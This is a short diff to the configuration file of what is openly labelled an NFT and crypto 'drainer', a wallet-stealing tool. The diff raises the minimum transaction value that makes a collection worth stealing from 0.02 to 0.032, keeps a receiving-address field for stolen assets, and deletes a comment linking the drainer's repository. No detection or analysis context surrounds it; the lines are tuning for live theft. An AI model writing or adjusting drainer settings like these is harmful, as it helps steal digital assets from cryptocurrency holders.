@@ -32,13 +32,12 @@ const mintInfo = {
 
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.02,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.032,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
 }
 
 /* 
-    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
 */
 
 //#region Check Configuration
